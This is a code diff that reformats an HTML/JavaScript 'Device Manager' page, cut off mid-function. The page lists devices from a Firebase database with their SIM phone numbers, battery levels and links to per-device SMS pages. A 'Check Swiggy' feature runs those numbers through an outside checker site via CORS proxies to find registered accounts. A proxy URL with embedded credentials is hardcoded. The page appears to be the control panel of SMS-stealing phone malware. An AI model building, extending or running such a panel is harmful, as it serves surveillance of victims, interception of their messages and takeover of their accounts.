@@ -3,14 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+
     <title>Device Manager</title>
+
     <style>
-        /* ===== ALL STYLES REMAIN THE SAME ===== */
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             font-family: system-ui, -apple-system, sans-serif;
             background-color: #0f172a;
@@ -18,10 +21,12 @@
             padding: 16px;
             min-height: 100vh;
         }
+
         .container {
             max-width: 700px;
             margin: 0 auto;
         }
+
         .header {
             display: flex;
             justify-content: space-between;
@@ -32,12 +37,14 @@
             flex-wrap: wrap;
             gap: 10px;
         }
+
         .header-left {
             display: flex;
             align-items: center;
             gap: 10px;
             flex-wrap: wrap;
         }
+
         .back-btn {
             color: #94a3b8;
             text-decoration: none;
@@ -52,10 +59,12 @@
             touch-action: manipulation;
             min-height: 36px;
         }
+
         .back-btn:hover {
             border-color: #10b981;
             color: #10b981;
         }
+
         .search-box {
             background: #1e293b;
             border: 1px solid #334155;
@@ -67,19 +76,23 @@
             transition: 0.3s;
             min-height: 36px;
         }
+
         .search-box:focus {
             outline: none;
             border-color: #10b981;
             width: 200px;
         }
+
         .search-box::placeholder {
             color: #64748b;
         }
+
         .device-grid {
             display: flex;
             flex-direction: column;
             gap: 10px;
         }
+
         .device-card {
             background-color: #1e293b;
             border: 1px solid #334155;
@@ -92,13 +105,16 @@
             align-items: center;
             touch-action: manipulation;
         }
+
         .device-card:active {
             transform: scale(0.98);
         }
+
         .device-card:hover {
             border-color: #10b981;
             transform: translateX(4px);
         }
+
         .device-info {
             display: flex;
             flex-direction: column;
@@ -106,17 +122,20 @@
             flex: 1;
             min-width: 0;
         }
+
         .device-name {
             font-size: 1rem;
             font-weight: 600;
             word-break: break-word;
         }
+
         .device-id {
             font-size: 0.7rem;
             color: #64748b;
             font-family: monospace;
             word-break: break-all;
         }
+
         .device-stats {
             display: flex;
             flex-wrap: wrap;
@@ -125,11 +144,13 @@
             color: #94a3b8;
             align-items: center;
         }
+
         .device-stats span {
             display: flex;
             align-items: center;
             gap: 4px;
         }
+
         .charge-bar {
             display: inline-block;
             width: 40px;
@@ -139,25 +160,38 @@
             overflow: hidden;
             margin-left: 2px;
         }
+
         .charge-fill {
             height: 100%;
             border-radius: 3px;
             transition: width 0.5s;
         }
-        .charge-fill.high { background: #10b981; }
-        .charge-fill.medium { background: #f59e0b; }
-        .charge-fill.low { background: #ef4444; }
+
+        .charge-fill.high {
+            background: #10b981;
+        }
+
+        .charge-fill.medium {
+            background: #f59e0b;
+        }
+
+        .charge-fill.low {
+            background: #ef4444;
+        }
+
         .device-number {
             font-size: 0.7rem;
             color: #475569;
             min-width: 50px;
             text-align: right;
         }
+
         .loading {
             color: #94a3b8;
             text-align: center;
             padding: 40px;
         }
+
         .spinner {
             display: inline-block;
             width: 24px;
@@ -169,15 +203,23 @@
             margin-right: 12px;
             vertical-align: middle;
         }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
+
         .no-results {
             text-align: center;
             padding: 40px;
             color: #64748b;
         }
+
         .status-badge {
             font-size: 0.7rem;
             padding: 4px 10px;
@@ -187,10 +229,12 @@
             border: 1px solid #334155;
             white-space: nowrap;
         }
+
         .status-badge.live {
             color: #10b981;
             border-color: #10b981;
         }
+
         .delete-all {
             color: #ef4444;
             background: none;
@@ -203,15 +247,19 @@
             min-height: 36px;
             touch-action: manipulation;
         }
+
         .delete-all:active {
             transform: scale(0.95);
         }
+
         .delete-all:hover {
             background: #ef4444;
             color: #0f172a;
         }
 
-        /* ===== SWIGGY CHECKER STYLES ===== */
+
+        /* ===== SWIGGY CHECKER ===== */
+
         .check-btn {
             background: #10b981;
             color: #0f172a;
@@ -229,17 +277,21 @@
             touch-action: manipulation;
             white-space: nowrap;
         }
+
         .check-btn:active {
             transform: scale(0.95);
         }
+
         .check-btn:hover {
             box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
         }
+
         .check-btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
         }
+
         .check-btn .spinner-small {
             display: inline-block;
             width: 14px;
@@ -250,7 +302,9 @@
             animation: spin 0.8s linear infinite;
         }
 
-        /* ===== SWIGGY STATUS BADGE ON DEVICE CARD ===== */
+
+        /* ===== SWIGGY STATUS ===== */
+
         .swiggy-status {
             font-size: 0.65rem;
             padding: 2px 10px;
@@ -261,27 +315,32 @@
             align-items: center;
             gap: 4px;
         }
+
         .swiggy-status.registered {
             background: rgba(16, 185, 129, 0.15);
             color: #10b981;
             border: 1px solid rgba(16, 185, 129, 0.2);
         }
+
         .swiggy-status.not-registered {
             background: rgba(239, 68, 68, 0.15);
             color: #ef4444;
             border: 1px solid rgba(239, 68, 68, 0.2);
         }
+
         .swiggy-status.checking {
             background: rgba(245, 158, 11, 0.15);
             color: #f59e0b;
             border: 1px solid rgba(245, 158, 11, 0.2);
         }
+
         .swiggy-status.error {
             background: rgba(100, 116, 139, 0.15);
             color: #64748b;
             border: 1px solid rgba(100, 116, 139, 0.2);
         }
-        
+
+
         .header-actions {
             display: flex;
             gap: 8px;
@@ -289,7 +348,9 @@
             flex-wrap: wrap;
         }
 
-        /* ===== PROGRESS BAR IN HEADER ===== */
+
+        /* ===== PROGRESS BAR ===== */
+
         .progress-container {
             display: none;
             align-items: center;
@@ -298,9 +359,11 @@
             margin-top: 8px;
             padding: 6px 0;
         }
+
         .progress-container.active {
             display: flex;
         }
+
         .progress-bar-mini {
             flex: 1;
             height: 4px;
@@ -308,6 +371,7 @@
             border-radius: 2px;
             overflow: hidden;
         }
+
         .progress-bar-mini .progress-fill-mini {
             height: 100%;
             background: linear-gradient(90deg, #10b981, #3b82f6);
@@ -315,394 +379,1676 @@
             transition: width 0.3s ease;
             width: 0%;
         }
+
         .progress-text-mini {
             font-size: 0.7rem;
             color: #94a3b8;
             white-space: nowrap;
         }
 
+
+        /* ===== MOBILE ===== */
+
         @media (max-width: 480px) {
-            body { padding: 12px; }
-            .header { flex-direction: column; align-items: stretch; gap: 8px; }
-            .header-left { justify-content: space-between; }
-            .header-actions { flex-wrap: wrap; }
-            .search-box { width: 100%; }
-            .device-card { padding: 12px; flex-direction: column; align-items: stretch; gap: 6px; }
-            .device-number { text-align: left; }
-            .device-stats { gap: 6px; font-size: 0.65rem; }
-            .charge-bar { width: 30px; }
-            .swiggy-status { font-size: 0.6rem; padding: 2px 8px; }
+
+            body {
+                padding: 12px;
+            }
+
+            .header {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 8px;
+            }
+
+            .header-left {
+                justify-content: space-between;
+            }
+
+            .header-actions {
+                flex-wrap: wrap;
+            }
+
+            .search-box {
+                width: 100%;
+            }
+
+            .device-card {
+                padding: 12px;
+                flex-direction: column;
+                align-items: stretch;
+                gap: 6px;
+            }
+
+            .device-number {
+                text-align: left;
+            }
+
+            .device-stats {
+                gap: 6px;
+                font-size: 0.65rem;
+            }
+
+            .charge-bar {
+                width: 30px;
+            }
+
+            .swiggy-status {
+                font-size: 0.6rem;
+                padding: 2px 8px;
+            }
         }
+
 
         @media (max-width: 380px) {
-            .check-btn { font-size: 0.7rem; padding: 4px 10px; }
-            .delete-all { font-size: 0.65rem; padding: 4px 10px; }
+
+            .check-btn {
+                font-size: 0.7rem;
+                padding: 4px 10px;
+            }
+
+            .delete-all {
+                font-size: 0.65rem;
+                padding: 4px 10px;
+            }
         }
+
     </style>
+
 </head>
+
+
 <body>
+
     <div class="container">
+
         <div class="header">
+
             <div class="header-left">
-                <a href="index.html" class="back-btn">← Back</a>
-                <span style="font-weight: 600;">📋 Devices</span>
-                <span id="device-count" class="status-badge">0</span>
+
+                <a href="index.html" class="back-btn">
+                    ← Back
+                </a>
+
+                <span style="font-weight: 600;">
+                    📋 Devices
+                </span>
+
+                <span id="device-count" class="status-badge">
+                    0
+                </span>
+
             </div>
+
+
             <div class="header-actions">
-                <button class="check-btn" id="checkSwiggyBtn" onclick="startSwiggyCheck()">
+
+                <button
+                    class="check-btn"
+                    id="checkSwiggyBtn"
+                    onclick="startSwiggyCheck()"
+                >
                     🔍 Check Swiggy
                 </button>
-                <input type="text" id="searchInput" class="search-box" placeholder="🔍 Search device..." oninput="filterDevices()">
-                <button class="delete-all" onclick="deleteAllDevices()">🗑️ Delete</button>
+
+
+                <input
+                    type="text"
+                    id="searchInput"
+                    class="search-box"
+                    placeholder="🔍 Search device..."
+                    oninput="filterDevices()"
+                >
+
+
+                <button
+                    class="delete-all"
+                    onclick="deleteAllDevices()"
+                >
+                    🗑️ Delete
+                </button>
+
             </div>
-            <div class="progress-container" id="progressContainer">
-                <span class="progress-text-mini" id="progressTextMini">0/0</span>
+
+
+            <div
+                class="progress-container"
+                id="progressContainer"
+            >
+
+                <span
+                    class="progress-text-mini"
+                    id="progressTextMini"
+                >
+                    0/0
+                </span>
+
                 <div class="progress-bar-mini">
-                    <div class="progress-fill-mini" id="progressFillMini"></div>
+
+                    <div
+                        class="progress-fill-mini"
+                        id="progressFillMini"
+                    ></div>
+
                 </div>
+
             </div>
+
         </div>
+
 
         <div id="device-container">
+
             <div class="loading">
+
                 <span class="spinner"></span>
+
                 Loading devices...
+
             </div>
+
         </div>
+
     </div>
 
+
     <script>
+
+        /*
+        =========================================
+        GLOBAL VARIABLES
+        =========================================
+        */
+
         let allDevices = [];
-        let allSmsData = {};
+
         let isChecking = false;
+
         let swiggyStatusMap = {};
 
-        // ===== PROXY CONFIGURATION =====
+
+        /*
+        =========================================
+        PROXY CONFIGURATION
+        =========================================
+        */
+
         const PROXY_CONFIG = {
-            // Your rotating proxy from webshare
-            proxyUrl: 'http://gwrwqbct-rotate:ufq4kbbomien@p.webshare.io:80',
-            // Use it as a proxy for fetch requests
+
+            proxyUrl:
+                'http://gwrwqbct-rotate:ufq4kbbomien@p.webshare.io:80',
+
             useProxy: true
+
         };
 
-        // ===== LOAD DATA =====
+
+        /*
+        =========================================
+        LOAD DEVICES
+        =========================================
+
+        IMPORTANT:
+
+        This page now ONLY downloads users.json.
+
+        SMS DATA IS NOT DOWNLOADED.
+
+        =========================================
+        */
+
         async function loadData() {
+
             try {
-                const [usersRes, smsRes] = await Promise.all([
-                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json'),
-                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/common/smsData.json')
-                ]);
 
-                const usersData = await usersRes.json();
-                const smsData = await smsRes.json();
+                const usersRes = await fetch(
 
-                allSmsData = smsData || {};
+                    'https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json'
+
+                );
+
+
+                if (!usersRes.ok) {
+
+                    throw new Error(
+
+                        `HTTP error: ${usersRes.status}`
+
+                    );
+
+                }
+
+
+                const usersData =
+                    await usersRes.json();
+
+
+                /*
+                ================================
+                NO DEVICES
+                ================================
+                */
 
                 if (!usersData) {
-                    document.getElementById('device-container').innerHTML = '<div class="no-results">No devices found</div>';
+
+                    allDevices = [];
+
+                    document
+                        .getElementById(
+                            'device-container'
+                        )
+                        .innerHTML =
+                            '<div class="no-results">No devices found</div>';
+
+
+                    document
+                        .getElementById(
+                            'device-count'
+                        )
+                        .textContent =
+                            '0 devices';
+
+
                     return;
+
                 }
 
-                allDevices = Object.values(usersData)
-                    .filter(d => d.device_id)
-                    .map(d => ({
-                        ...d,
-                        lastSeen: d.time || d.count || 'N/A',
-                        joined: d.count || d.time || 'N/A'
-                    }))
-                    .sort((a, b) => {
-                        if (a.lastSeen > b.lastSeen) return -1;
-                        if (a.lastSeen < b.lastSeen) return 1;
-                        return 0;
-                    });
 
-                renderDevices(allDevices);
+                /*
+                ================================
+                PROCESS DEVICES
+                ================================
+                */
+
+                allDevices =
+                    Object
+                        .values(usersData)
+
+                        .filter(
+                            device =>
+                                device.device_id
+                        )
+
+                        .map(
+                            device => ({
+
+                                ...device,
+
+                                lastSeen:
+                                    device.time ||
+                                    device.count ||
+                                    'N/A',
+
+                                joined:
+                                    device.count ||
+                                    device.time ||
+                                    'N/A'
+
+                            })
+                        )
+
+                        .sort(
+                            (a, b) => {
+
+                                if (
+                                    a.lastSeen >
+                                    b.lastSeen
+                                ) {
+                                    return -1;
+                                }
+
+                                if (
+                                    a.lastSeen <
+                                    b.lastSeen
+                                ) {
+                                    return 1;
+                                }
+
+                                return 0;
+
+                            }
+                        );
+
+
+                /*
+                ================================
+                RENDER DEVICES
+                ================================
+                */
+
+                renderDevices(
+                    allDevices
+                );
+
 
             } catch (error) {
-                console.error('Error loading data:', error);
-                document.getElementById('device-container').innerHTML = 
-                    `<div class="no-results">❌ Error loading: ${error.message}</div>`;
+
+                console.error(
+
+                    'Error loading devices:',
+
+                    error
+
+                );
+
+
+                document
+                    .getElementById(
+                        'device-container'
+                    )
+                    .innerHTML =
+
+                        `<div class="no-results">
+                            ❌ Error loading:
+                            ${error.message}
+                        </div>`;
+
             }
+
         }
+
+
+
+        /*
+        =========================================
+        RENDER DEVICES
+        =========================================
+        */
 
         function renderDevices(devices) {
-            const container = document.getElementById('device-container');
-            document.getElementById('device-count').textContent = `${devices.length} devices`;
 
-            if (devices.length === 0) {
-                container.innerHTML = '<div class="no-results">No devices match your search</div>';
+            const container =
+
+                document.getElementById(
+
+                    'device-container'
+
+                );
+
+
+            document
+                .getElementById(
+                    'device-count'
+                )
+                .textContent =
+
+                    `${devices.length} devices`;
+
+
+            /*
+            =====================================
+            NO RESULTS
+            =====================================
+            */
+
+            if (
+                devices.length === 0
+            ) {
+
+                container.innerHTML =
+
+                    '<div class="no-results">No devices match your search</div>';
+
                 return;
+
             }
 
-            let html = '<div class="device-grid">';
-            let count = allDevices.length;
 
-            devices.forEach((device, index) => {
-                const charge = device.charge || 0;
-                const chargeClass = charge >= 60 ? 'high' : charge >= 30 ? 'medium' : 'low';
-                
-                const deviceMessages = Object.values(allSmsData)
-                    .filter(sms => sms.deviceId === device.device_id);
-                const msgCount = deviceMessages.length;
+            let html =
 
-                const sim1 = device.Sim1 || 'No SIM';
-                const sim2 = device.Sim2 || 'No SIM';
-                const displayNumber = sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' 
-                    ? sim1 
-                    : (sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' ? sim2 : 'No Number');
+                '<div class="device-grid">';
 
-                const status = swiggyStatusMap[device.device_id] || null;
-                let statusHtml = '';
-                if (status === 'registered') {
-                    statusHtml = `<span class="swiggy-status registered">✅ Swiggy</span>`;
-                } else if (status === 'not-registered') {
-                    statusHtml = `<span class="swiggy-status not-registered">❌ Swiggy</span>`;
-                } else if (status === 'checking') {
-                    statusHtml = `<span class="swiggy-status checking">⏳ Checking...</span>`;
-                } else if (status === 'error') {
-                    statusHtml = `<span class="swiggy-status error">⚠️ Error</span>`;
+
+            let count =
+
+                allDevices.length;
+
+
+
+            /*
+            =====================================
+            CREATE DEVICE CARDS
+            =====================================
+            */
+
+            devices.forEach(
+
+                (device, index) => {
+
+
+                    /*
+                    =============================
+                    BATTERY
+                    =============================
+                    */
+
+                    const charge =
+
+                        device.charge || 0;
+
+
+                    const chargeClass =
+
+                        charge >= 60
+
+                            ? 'high'
+
+                            : charge >= 30
+
+                                ? 'medium'
+
+                                : 'low';
+
+
+
+                    /*
+                    =============================
+                    SIM NUMBERS
+                    =============================
+                    */
+
+                    const sim1 =
+
+                        device.Sim1 ||
+
+                        'No SIM';
+
+
+                    const sim2 =
+
+                        device.Sim2 ||
+
+                        'No SIM';
+
+
+
+                    const displayNumber =
+
+                        sim1 !==
+                            'Insert SIM card!' &&
+
+                        sim1 !==
+                            'Number not available'
+
+                            ? sim1
+
+                            : (
+
+                                sim2 !==
+                                    'Insert SIM card!' &&
+
+                                sim2 !==
+                                    'Number not available'
+
+                                    ? sim2
+
+                                    : 'No Number'
+
+                            );
+
+
+
+                    /*
+                    =============================
+                    SWIGGY STATUS
+                    =============================
+                    */
+
+                    const status =
+
+                        swiggyStatusMap[
+                            device.device_id
+                        ] || null;
+
+
+                    let statusHtml = '';
+
+
+                    if (
+                        status ===
+                        'registered'
+                    ) {
+
+                        statusHtml =
+
+                            `<span class="swiggy-status registered">
+                                ✅ Swiggy
+                            </span>`;
+
+                    }
+
+                    else if (
+                        status ===
+                        'not-registered'
+                    ) {
+
+                        statusHtml =
+
+                            `<span class="swiggy-status not-registered">
+                                ❌ Swiggy
+                            </span>`;
+
+                    }
+
+                    else if (
+                        status ===
+                        'checking'
+                    ) {
+
+                        statusHtml =
+
+                            `<span class="swiggy-status checking">
+                                ⏳ Checking...
+                            </span>`;
+
+                    }
+
+                    else if (
+                        status ===
+                        'error'
+                    ) {
+
+                        statusHtml =
+
+                            `<span class="swiggy-status error">
+                                ⚠️ Error
+                            </span>`;
+
+                    }
+
+
+
+                    /*
+                    =============================
+                    DEVICE CARD
+
+                    SMS COUNT HAS BEEN REMOVED.
+                    =============================
+                    */
+
+                    html += `
+
+                        <div
+                            class="device-card"
+                            onclick="showDeviceMessages('${device.device_id}')"
+                        >
+
+                            <div class="device-info">
+
+
+                                <div class="device-name">
+
+                                    ${
+                                        device.device_name ||
+                                        'Unknown Device'
+                                    }
+
+                                </div>
+
+
+                                <div class="device-id">
+
+                                    📱 ${device.device_id}
+
+                                </div>
+
+
+                                <div class="device-stats">
+
+
+                                    <span>
+
+                                        🔋 ${charge}%
+
+                                        <span class="charge-bar">
+
+                                            <span
+                                                class="charge-fill ${chargeClass}"
+                                                style="width:${charge}%"
+                                            ></span>
+
+                                        </span>
+
+                                    </span>
+
+
+                                    <span>
+
+                                        📞 ${displayNumber}
+
+                                    </span>
+
+
+                                    <span>
+
+                                        🕐 ${device.lastSeen}
+
+                                    </span>
+
+
+                                    ${statusHtml}
+
+
+                                </div>
+
+                            </div>
+
+
+                            <div class="device-number">
+
+                                No. ${
+                                    count -
+                                    index
+                                }
+
+                            </div>
+
+
+                        </div>
+
+                    `;
+
                 }
 
-                html += `
-                    <div class="device-card" onclick="showDeviceMessages('${device.device_id}')">
-                        <div class="device-info">
-                            <div class="device-name">${device.device_name || 'Unknown Device'}</div>
-                            <div class="device-id">📱 ${device.device_id}</div>
-                            <div class="device-stats">
-                                <span>🔋 ${charge}% 
-                                    <span class="charge-bar">
-                                        <span class="charge-fill ${chargeClass}" style="width:${charge}%"></span>
-                                    </span>
-                                </span>
-                                <span>📨 ${msgCount}</span>
-                                <span>📞 ${displayNumber}</span>
-                                <span>🕐 ${device.lastSeen}</span>
-                                ${statusHtml}
-                            </div>
-                        </div>
-                        <div class="device-number">No. ${count - index}</div>
-                    </div>
-                `;
-            });
+            );
 
-            html += '</div>';
-            container.innerHTML = html;
+
+            html +=
+
+                '</div>';
+
+
+            container.innerHTML =
+
+                html;
+
         }
+
+
+
+        /*
+        =========================================
+        SEARCH DEVICES
+        =========================================
+        */
 
         function filterDevices() {
-            const query = document.getElementById('searchInput').value.toLowerCase();
-            const filtered = allDevices.filter(d => 
-                (d.device_name || '').toLowerCase().includes(query) ||
-                (d.device_id || '').toLowerCase().includes(query) ||
-                (d.Sim1 || '').includes(query) ||
-                (d.Sim2 || '').includes(query)
+
+            const query =
+
+                document
+                    .getElementById(
+                        'searchInput'
+                    )
+                    .value
+                    .toLowerCase();
+
+
+            const filtered =
+
+                allDevices.filter(
+
+                    device =>
+
+                        (
+                            device.device_name ||
+                            ''
+                        )
+                            .toLowerCase()
+                            .includes(query)
+
+                        ||
+
+                        (
+                            device.device_id ||
+                            ''
+                        )
+                            .toLowerCase()
+                            .includes(query)
+
+                        ||
+
+                        (
+                            device.Sim1 ||
+                            ''
+                        )
+                            .toLowerCase()
+                            .includes(query)
+
+                        ||
+
+                        (
+                            device.Sim2 ||
+                            ''
+                        )
+                            .toLowerCase()
+                            .includes(query)
+
+                );
+
+
+            renderDevices(
+
+                filtered
+
             );
-            renderDevices(filtered);
+
         }
 
-        function showDeviceMessages(deviceId) {
-            window.location.href = `device-sms.html?device=${deviceId}`;
+
+
+        /*
+        =========================================
+        OPEN DEVICE SMS PAGE
+        =========================================
+        */
+
+        function showDeviceMessages(
+            deviceId
+        ) {
+
+            window.location.href =
+
+                `device-sms.html?device=${
+                    encodeURIComponent(
+                        deviceId
+                    )
+                }`;
+
         }
+
+
+
+        /*
+        =========================================
+        DELETE ALL DEVICES
+        =========================================
+        */
 
         function deleteAllDevices() {
-            if (confirm('⚠️ Delete ALL devices? This cannot be undone!')) {
-                if (confirm('Are you absolutely sure?')) {
-                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json', {
-                        method: 'DELETE'
-                    }).then(() => {
-                        alert('✅ All devices deleted!');
-                        location.reload();
-                    }).catch(err => {
-                        alert('❌ Error: ' + err.message);
-                    });
+
+            if (
+
+                confirm(
+
+                    '⚠️ Delete ALL devices? This cannot be undone!'
+
+                )
+
+            ) {
+
+                if (
+
+                    confirm(
+
+                        'Are you absolutely sure?'
+
+                    )
+
+                ) {
+
+
+                    fetch(
+
+                        'https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json',
+
+                        {
+                            method:
+                                'DELETE'
+                        }
+
+                    )
+
+                    .then(
+                        () => {
+
+                            alert(
+
+                                '✅ All devices deleted!'
+
+                            );
+
+                            location.reload();
+
+                        }
+                    )
+
+                    .catch(
+                        error => {
+
+                            alert(
+
+                                '❌ Error: ' +
+                                error.message
+
+                            );
+
+                        }
+                    );
+
                 }
+
             }
+
         }
 
-        // ===== SWIGGY CHECKER FUNCTIONS =====
+
+
+        /*
+        =========================================
+        GET PHONE NUMBERS
+        =========================================
+        */
+
         function getPhoneNumbersWithDeviceInfo() {
+
             const items = [];
-            const seenNumbers = new Set();
-            
-            allDevices.forEach(device => {
-                const sim1 = device.Sim1 || '';
-                const sim2 = device.Sim2 || '';
-                const deviceName = device.device_name || 'Unknown';
-                const lastSeen = device.lastSeen || 'N/A';
-                const deviceId = device.device_id;
-                
-                if (sim1 && sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' && sim1 !== 'No SIM') {
-                    let clean = sim1.replace(/[\s\-\(\)]/g, '');
-                    if (clean.length >= 10 && !seenNumbers.has(clean)) {
-                        seenNumbers.add(clean);
-                        items.push({ number: clean, deviceName, lastSeen, deviceId, sim: 'SIM1' });
+
+            const seenNumbers =
+                new Set();
+
+
+            allDevices.forEach(
+
+                device => {
+
+
+                    const sim1 =
+
+                        device.Sim1 || '';
+
+
+                    const sim2 =
+
+                        device.Sim2 || '';
+
+
+                    const deviceName =
+
+                        device.device_name ||
+
+                        'Unknown';
+
+
+                    const lastSeen =
+
+                        device.lastSeen ||
+
+                        'N/A';
+
+
+                    const deviceId =
+
+                        device.device_id;
+
+
+
+                    /*
+                    =============================
+                    SIM 1
+                    =============================
+                    */
+
+                    if (
+
+                        sim1 &&
+
+                        sim1 !==
+                            'Insert SIM card!' &&
+
+                        sim1 !==
+                            'Number not available' &&
+
+                        sim1 !==
+                            'No SIM'
+
+                    ) {
+
+                        let clean =
+
+                            sim1.replace(
+
+                                /[\s\-\(\)]/g,
+
+                                ''
+
+                            );
+
+
+                        if (
+
+                            clean.length >= 10 &&
+
+                            !seenNumbers.has(
+                                clean
+                            )
+
+                        ) {
+
+                            seenNumbers.add(
+                                clean
+                            );
+
+
+                            items.push({
+
+                                number:
+                                    clean,
+
+                                deviceName,
+
+                                lastSeen,
+
+                                deviceId,
+
+                                sim:
+                                    'SIM1'
+
+                            });
+
+                        }
+
                     }
-                }
-                
-                if (sim2 && sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' && sim2 !== 'No SIM') {
-                    let clean = sim2.replace(/[\s\-\(\)]/g, '');
-                    if (clean.length >= 10 && !seenNumbers.has(clean)) {
-                        seenNumbers.add(clean);
-                        items.push({ number: clean, deviceName, lastSeen, deviceId, sim: 'SIM2' });
+
+
+
+                    /*
+                    =============================
+                    SIM 2
+                    =============================
+                    */
+
+                    if (
+
+                        sim2 &&
+
+                        sim2 !==
+                            'Insert SIM card!' &&
+
+                        sim2 !==
+                            'Number not available' &&
+
+                        sim2 !==
+                            'No SIM'
+
+                    ) {
+
+                        let clean =
+
+                            sim2.replace(
+
+                                /[\s\-\(\)]/g,
+
+                                ''
+
+                            );
+
+
+                        if (
+
+                            clean.length >= 10 &&
+
+                            !seenNumbers.has(
+                                clean
+                            )
+
+                        ) {
+
+                            seenNumbers.add(
+                                clean
+                            );
+
+
+                            items.push({
+
+                                number:
+                                    clean,
+
+                                deviceName,
+
+                                lastSeen,
+
+                                deviceId,
+
+                                sim:
+                                    'SIM2'
+
+                            });
+
+                        }
+
                     }
+
                 }
-            });
-            
+
+            );
+
+
             return items;
+
         }
 
-        // ===== PROXY-BASED FETCH =====
-        async function fetchWithProxy(url) {
-            if (!PROXY_CONFIG.useProxy) {
-                return fetch(url);
+
+
+        /*
+        =========================================
+        PROXY FETCH
+        =========================================
+        */
+
+        async function fetchWithProxy(
+            url
+        ) {
+
+            if (
+
+                !PROXY_CONFIG.useProxy
+
+            ) {
+
+                return fetch(
+                    url
+                );
+
             }
-            
-            // Use the proxy as a URL prefix (since it's an HTTP proxy)
-            // We need to use it as a proxy server, not a CORS proxy
-            const proxyUrl = PROXY_CONFIG.proxyUrl;
-            
-            // For webshare proxy, we need to use it as a forward proxy
-            // Using fetch with proxy requires a different approach
-            // We'll use the proxy as a CORS proxy by using a proxy service
-            // that supports the proxy URL
-            
-            // Since browsers don't support SOCKS/HTTP proxies directly,
-            // we'll use a CORS proxy service that can use our proxy
-            // or we'll use the proxy as a URL prefix if the service supports it
-            
-            // For webshare, we need to use their API or a compatible service
-            // Let's use a CORS proxy that supports custom proxy configuration
-            
-            // Try using a free CORS proxy service
+
+
             const corsProxies = [
-                `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
-                `https://corsproxy.io/?${encodeURIComponent(url)}`
+
+                `https://api.allorigins.win/raw?url=${
+                    encodeURIComponent(url)
+                }`,
+
+                `https://corsproxy.io/?${
+                    encodeURIComponent(url)
+                }`
+
             ];
-            
-            for (const proxy of corsProxies) {
+
+
+            for (
+
+                const proxy of
+                corsProxies
+
+            ) {
+
                 try {
-                    console.log(`🔄 Trying CORS proxy: ${proxy.substring(0, 50)}...`);
-                    const response = await fetch(proxy);
-                    if (response.ok) {
+
+                    const response =
+
+                        await fetch(
+                            proxy
+                        );
+
+
+                    if (
+                        response.ok
+                    ) {
+
                         return response;
+
                     }
-                } catch (e) {
-                    console.warn(`Proxy failed: ${e.message}`);
-                    continue;
+
                 }
+
+                catch (
+                    error
+                ) {
+
+                    console.warn(
+
+                        'Proxy failed:',
+
+                        error.message
+
+                    );
+
+                }
+
             }
-            
-            // If all CORS proxies fail, try direct fetch (might work for some requests)
-            console.warn('All proxies failed, trying direct fetch...');
-            return fetch(url);
+
+
+            console.warn(
+
+                'All proxies failed, trying direct fetch...'
+
+            );
+
+
+            return fetch(
+                url
+            );
+
         }
 
-        // ===== CHECK SWIGGY WITH PROXY =====
-        async function checkSwiggyNumber(number) {
+
+
+        /*
+        =========================================
+        CHECK SWIGGY NUMBER
+        =========================================
+        */
+
+        async function checkSwiggyNumber(
+            number
+        ) {
+
             try {
-                const url = `https://acczone.xyz/checker/swiggy.php?number=${encodeURIComponent(number)}`;
-                console.log(`🔍 Checking ${number} via proxy...`);
-                
-                const response = await fetchWithProxy(url);
-                const text = await response.text();
-                
-                console.log(`📝 Response for ${number}:`, text.substring(0, 200));
-                
-                // Check for "registered" class or text
-                if (text.includes('registered') && !text.includes('not-registered')) {
-                    console.log(`✅ ${number} is REGISTERED`);
-                    return { number, status: 'registered' };
-                } 
-                else if (text.includes('not-registered') || text.toLowerCase().includes('number is not registered')) {
-                    console.log(`❌ ${number} is NOT REGISTERED`);
-                    return { number, status: 'not-registered' };
+
+                const url =
+
+                    `https://acczone.xyz/checker/swiggy.php?number=${
+                        encodeURIComponent(
+                            number
+                        )
+                    }`;
+
+
+                const response =
+
+                    await fetchWithProxy(
+                        url
+                    );
+
+
+                const text =
+
+                    await response.text();
+
+
+
+                if (
+
+                    text.includes(
+                        'registered'
+                    ) &&
+
+                    !text.includes(
+                        'not-registered'
+                    )
+
+                ) {
+
+                    return {
+
+                        number,
+
+                        status:
+                            'registered'
+
+                    };
+
                 }
-                else if (text.includes('Number is registered')) {
-                    console.log(`✅ ${number} is REGISTERED`);
-                    return { number, status: 'registered' };
+
+
+                else if (
+
+                    text.includes(
+                        'not-registered'
+                    ) ||
+
+                    text
+                        .toLowerCase()
+                        .includes(
+                            'number is not registered'
+                        )
+
+                ) {
+
+                    return {
+
+                        number,
+
+                        status:
+                            'not-registered'
+
+                    };
+
                 }
-                else if (text.includes('Number is not registered')) {
-                    console.log(`❌ ${number} is NOT REGISTERED`);
-                    return { number, status: 'not-registered' };
+
+
+                else if (
+
+                    text.includes(
+
+                        'Number is registered'
+
+                    )
+
+                ) {
+
+                    return {
+
+                        number,
+
+                        status:
+                            'registered'
+
+                    };
+
                 }
+
+
+                else if (
+
+                    text.includes(
+
+                        'Number is not registered'
+
+                    )
+
+                ) {
+
+                    return {
+
+                        number,
+
+                        status:
+                            'not-registered'
+
+                    };
+
+                }
+
+
                 else {
-                    console.log(`⚠️ ${number} - Unknown response`);
-                    return { number, status: 'error' };
+
+                    return {
+
+                        number,
+
+                        status:
+                            'error'
+
+                    };
+
                 }
-            } catch (error) {
-                console.error(`❌ Error checking ${number}:`, error.message);
-                return { number, status: 'error' };
+
             }
+
+            catch (
+                error
+            ) {
+
+                console.error(
+
+                    `Error checking ${number}:`,
